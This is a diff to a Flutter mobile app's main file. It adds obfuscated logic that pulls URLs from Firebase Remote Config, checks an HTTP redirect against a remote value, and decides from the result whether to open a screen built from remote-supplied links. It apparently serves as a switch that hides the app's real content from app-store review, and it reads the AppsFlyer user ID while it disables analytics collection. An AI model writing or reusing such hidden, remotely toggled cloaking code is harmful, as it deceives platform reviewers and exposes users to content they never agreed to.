@@ -1,5 +1,8 @@
+import 'dart:io';
+
 import 'package:app_tracking_transparency/app_tracking_transparency.dart';
 import 'package:appsflyer_sdk/appsflyer_sdk.dart';
+import 'package:firebase_analytics/firebase_analytics.dart';
 import 'package:firebase_core/firebase_core.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/material.dart';
@@ -25,6 +28,8 @@ String _afStatus = '';
 String _campaign = '';
 String _campaignId = '';
 
+late FirebaseAnalyticsObserver observer;
+
 Future<void> main() async {
   WidgetsFlutterBinding.ensureInitialized();
   await AppTrackingTransparency.requestTrackingAuthorization();
@@ -34,6 +39,13 @@ Future<void> main() async {
     minimumFetchInterval: const Duration(seconds: 25),
   ));
   await FirebaseRemoteConfig.instance.fetchAndActivate();
+  FirebaseAnalytics analytics = FirebaseAnalytics.instance;
+  observer = FirebaseAnalyticsObserver(analytics: analytics);
+
+  // Disable ad ID collection
+  await analytics.setAnalyticsCollectionEnabled(false);
+  await analytics.setUserProperty(name: 'collect_adid', value: 'false');
+
   await Notifas().activate();
   await tewdew();
   bool isFirstTime = await OnboardingRepository().checkFirstTime();
@@ -112,6 +124,7 @@ Future<void> afSbin() async {
 
     _deepLinkData = dp.toJson();
   });
+  apsID = await _appsflyerSdk.getAppsFlyerUID() ?? '';
   _appsflyerSdk.startSDK(
     onSuccess: () {
       print("AppsFlyer SDK initialized successfully.");
@@ -122,6 +135,7 @@ Future<void> afSbin() async {
 String dx = '';
 String df = '';
 String dataz = '';
+String xm = '';
 Future<bool> checkdas() async {
   final gazel = FirebaseRemoteConfig.instance;
   await gazel.fetchAndActivate();
@@ -129,11 +143,21 @@ Future<bool> checkdas() async {
   String dsdfdsfgdg1 = gazel.getString('info');
   String dsdfdsfgdg2 = gazel.getString('plannerx');
   String dsdfdsfgdg3 = gazel.getString('data');
+  String dsdfdsfgdg4 = gazel.getString('datanull');
   dx = dsdfdsfgdg1;
   df = dsdfdsfgdg2;
   dataz = dsdfdsfgdg3;
   datioq = dsdfdsfgdg;
+  xm = dsdfdsfgdg4;
   await afSbin();
+  final fdsgdf = HttpClient();
+  final vcxxs = Uri.parse(datioq);
+  final ndsfjak = await fdsgdf.getUrl(vcxxs);
+  ndsfjak.followRedirects = false;
+  final response = await ndsfjak.close();
+  if (response.headers.value(HttpHeaders.locationHeader) != xm) {
+    return true;
+  }
   return dsdfdsfgdg.contains('none') ? false : true;
 }
 
@@ -170,8 +194,8 @@ class MyApp extends StatelessWidget {
             return MaterialApp(
               debugShowCheckedModeBanner: false,
               home: PreviewFoxa(
-                params: dx,
-                lnk: df,
+                params: datioq,
+                lnk: acceptPromo,
                 data: dataz,
               ),
             );
